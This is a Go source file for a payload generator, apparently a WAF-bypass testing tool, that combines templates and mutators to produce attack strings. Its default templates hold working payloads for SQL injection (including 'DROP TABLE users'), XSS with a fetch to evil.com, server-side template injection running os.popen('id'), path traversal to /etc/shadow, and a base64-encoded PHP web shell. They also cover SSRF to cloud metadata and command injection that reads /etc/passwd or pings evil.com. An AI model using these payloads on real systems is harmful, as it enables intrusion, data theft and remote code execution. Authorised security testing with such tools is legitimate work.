// Package payloadgen provides dynamic payload generation and mutation
// for WAF bypass testing. It uses template-based generation with variable
// substitution and chained mutators to produce diverse attack payloads.
package payloadgen

import (
	"strings"
)

// GenerationContext controls what kind of payloads to generate.
type GenerationContext struct {
	// Category limits generation to a specific attack type (e.g. "sqli", "xss").
	Category string

	// TargetVendor biases generation toward vendor-specific bypasses.
	TargetVendor string

	// MaxPayloads caps the total number of generated payloads (0 = unlimited).
	MaxPayloads int

	// BlockedPatterns skips payloads containing any of these strings.
	BlockedPatterns []string
}

// PayloadTemplate defines a pattern for generating payloads.
// Variables in the Pattern (e.g. {{comment}}, {{space}}) are replaced
// with each combination from the Variables map.
type PayloadTemplate struct {
	Pattern   string              // e.g. "' {{comment}}UNION{{space}}SELECT{{space}}1,2,3--"
	Variables map[string][]string // e.g. {"comment": ["/**/", "/*!*/"], "space": [" ", "\t", "+"]}
	Category  string
	Tags      []string
}

// Generator produces payloads from templates and applies mutators.
type Generator struct {
	Templates map[string][]PayloadTemplate // keyed by category
	Mutators  []Mutator
}

// NewGenerator creates a Generator preloaded with default templates.
func NewGenerator() *Generator {
	g := &Generator{
		Templates: make(map[string][]PayloadTemplate),
	}
	g.loadDefaults()
	return g
}

// Generate produces payloads for the given context.
// It expands templates via variable substitution, applies any configured
// mutators, and deduplicates the output.
func (g *Generator) Generate(ctx GenerationContext) []string {
	templates := g.templatesForContext(ctx)
	seen := make(map[string]bool, len(templates)*4)
	var results []string

	for _, tmpl := range templates {
		expanded := expandTemplate(tmpl)
		for _, payload := range expanded {
			if blocked(payload, ctx.BlockedPatterns) {
				continue
			}
			if !seen[payload] {
				seen[payload] = true
				results = append(results, payload)
			}

			// Apply mutators to each expanded payload
			for _, m := range g.Mutators {
				for _, mutated := range m.Mutate(payload) {
					if blocked(mutated, ctx.BlockedPatterns) {
						continue
					}
					if !seen[mutated] {
						seen[mutated] = true
						results = append(results, mutated)
					}
				}
			}

			if ctx.MaxPayloads > 0 && len(results) >= ctx.MaxPayloads {
				return results[:ctx.MaxPayloads]
			}
		}
	}

	return results
}

// AddTemplate adds a custom template for the given category.
func (g *Generator) AddTemplate(category string, tmpl PayloadTemplate) {
	tmpl.Category = category
	g.Templates[category] = append(g.Templates[category], tmpl)
}

// templatesForContext selects templates matching the context.
func (g *Generator) templatesForContext(ctx GenerationContext) []PayloadTemplate {
	if ctx.Category != "" {
		return g.Templates[strings.ToLower(ctx.Category)]
	}
	// No category filter — return all templates.
	var all []PayloadTemplate
	for _, tmpls := range g.Templates {
		all = append(all, tmpls...)
	}
	return all
}

// expandTemplate generates all combinations of variable substitutions.
func expandTemplate(tmpl PayloadTemplate) []string {
	if len(tmpl.Variables) == 0 {
		return []string{tmpl.Pattern}
	}

	// Collect variable names and their value lists.
	var names []string
	var values [][]string
	for name, vals := range tmpl.Variables {
		names = append(names, name)
		values = append(values, vals)
	}

	// Generate cartesian product of all variable values.
	combos := cartesian(values)
	results := make([]string, 0, len(combos))
	for _, combo := range combos {
		s := tmpl.Pattern
		for i, name := range names {
			s = strings.ReplaceAll(s, "{{"+name+"}}", combo[i])
		}
		results = append(results, s)
	}
	return results
}

// maxCartesianSize caps the cartesian product to prevent OOM on pathological inputs.
const maxCartesianSize = 100_000

// cartesian computes the cartesian product of a list of string slices.
// It caps the result at maxCartesianSize to prevent OOM from combinatorial explosion.
func cartesian(lists [][]string) [][]string {
	if len(lists) == 0 {
		return [][]string{{}}
	}
	result := [][]string{{}}
	for _, list := range lists {
		var next [][]string
		for _, existing := range result {
			for _, val := range list {
				combo := make([]string, len(existing)+1)
				copy(combo, existing)
				combo[len(existing)] = val
				next = append(next, combo)
				if len(next) >= maxCartesianSize {
					return next
				}
			}
		}
		result = next
	}
	return result
}

// blocked returns true if payload contains any blocked pattern.
func blocked(payload string, patterns []string) bool {
	lower := strings.ToLower(payload)
	for _, p := range patterns {
		if strings.Contains(lower, strings.ToLower(p)) {
			return true
		}
	}
	return false
}

// loadDefaults populates the generator with curated attack templates.
func (g *Generator) loadDefaults() {
	// SQL Injection templates
	g.Templates["sqli"] = []PayloadTemplate{
		{
			Pattern: "' {{comment}}UNION{{space}}SELECT{{space}}{{columns}}--",
			Variables: map[string][]string{
				"comment": {"", "/**/", "/*!*/", "/*!50000*/"},
				"space":   {" ", "\t", "+", "%20", "/**/"},
				"columns": {"1,2,3", "NULL,NULL,NULL", "@@version,2,3"},
			},
			Category: "sqli",
			Tags:     []string{"union", "bypass"},
		},
		{
			Pattern: "' {{logic}}{{operator}}{{value}}--",
			Variables: map[string][]string{
				"logic":    {"OR", "AND", "||", "&&"},
				"operator": {" ", "/**/"},
				"value":    {"1=1", "'a'='a'", "1 LIKE 1", "1 BETWEEN 0 AND 2"},
			},
			Category: "sqli",
			Tags:     []string{"boolean", "bypass"},
		},
		{
			Pattern: "{{payload}}",
			Variables: map[string][]string{
				"payload": {
					"' OR ''='", "admin'--", "1; DROP TABLE users--",
					"' HAVING 1=1--", "' GROUP BY 1--",
					"'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
					"1' ORDER BY 1--", "' UNION ALL SELECT NULL--",
				},
			},
			Category: "sqli",
			Tags:     []string{"classic"},
		},
	}

	// XSS templates
	g.Templates["xss"] = []PayloadTemplate{
		{
			Pattern: "<{{tag}}{{space}}{{handler}}={{quote}}{{js}}{{quote}}>",
			Variables: map[string][]string{
				"tag":     {"svg", "img", "body", "details", "marquee", "input"},
				"space":   {" ", "/", "\t", "\n"},
				"handler": {"onload", "onerror", "onfocus", "onmouseover", "ontoggle"},
				"quote":   {"\"", "'", ""},
				"js":      {"alert(1)", "confirm(1)", "prompt(1)", "alert`1`"},
			},
			Category: "xss",
			Tags:     []string{"event-handler", "bypass"},
		},
		{
			Pattern: "<script{{attr}}>{{js}}</script>",
			Variables: map[string][]string{
				"attr": {"", " type=\"text/javascript\"", " nonce=\"\""},
				"js":   {"alert(1)", "alert(document.domain)", "fetch('//evil.com')"},
			},
			Category: "xss",
			Tags:     []string{"script", "basic"},
		},
		{
			Pattern: "{{payload}}",
			Variables: map[string][]string{
				"payload": {
					"javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
					"<iframe src=\"javascript:alert(1)\">",
					"<object data=\"javascript:alert(1)\">",
					"<embed src=\"javascript:alert(1)\">",
				},
			},
			Category: "xss",
			Tags:     []string{"protocol", "bypass"},
		},
	}

	// SSTI templates
	g.Templates["ssti"] = []PayloadTemplate{
		{
			Pattern: "{{open}}{{expression}}{{close}}",
			Variables: map[string][]string{
				"open":       {"{{", "${", "#{", "<%= ", "${{"},
				"expression": {"7*7", "7*'7'", "__import__('os').popen('id').read()", "config.items()"},
				"close":      {"}}", "}", "%>"},
			},
			Category: "ssti",
			Tags:     []string{"detection", "bypass"},
		},
	}

	// LFI templates
	g.Templates["lfi"] = []PayloadTemplate{
		{
			Pattern: "{{traversal}}{{target}}",
			Variables: map[string][]string{
				"traversal": {
					"../", "....//", "..%2f", "%2e%2e/", "%2e%2e%2f",
					"..\\", "..%5c", "....\\\\",
				},
				"target": {
					"etc/passwd", "etc/shadow", "windows/win.ini",
					"proc/self/environ", "proc/self/cmdline",
				},
			},
			Category: "lfi",
			Tags:     []string{"traversal", "bypass"},
		},
		{
			Pattern: "{{wrapper}}",
			Variables: map[string][]string{
				"wrapper": {
					"php://filter/convert.base64-encode/resource=index.php",
					"php://input", "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
					"file:///etc/passwd",
				},
			},
			Category: "lfi",
			Tags:     []string{"wrapper", "php"},
		},
	}

	// SSRF templates
	g.Templates["ssrf"] = []PayloadTemplate{
		{
			Pattern: "{{scheme}}{{host}}{{path}}",
			Variables: map[string][]string{
				"scheme": {"http://", "https://", "gopher://", "dict://", "file:///"},
				"host":   {"127.0.0.1", "0.0.0.0", "localhost", "[::1]", "0x7f000001", "2130706433", "017700000001"},
				"path":   {"", "/latest/meta-data/", "/admin", "/server-status"},
			},
			Category: "ssrf",
			Tags:     []string{"bypass", "ip-notation"},
		},
	}

	// Command injection templates
	g.Templates["rce"] = []PayloadTemplate{
		{
			Pattern: "{{prefix}}{{separator}}{{command}}",
			Variables: map[string][]string{
				"prefix":    {"", "test", "127.0.0.1"},
				"separator": {";", "|", "||", "&&", "`", "$(", "\n"},
				"command":   {"id", "whoami", "cat /etc/passwd", "ping -c1 evil.com"},
			},
			Category: "rce",
			Tags:     []string{"injection", "bypass"},
		},
	}
}
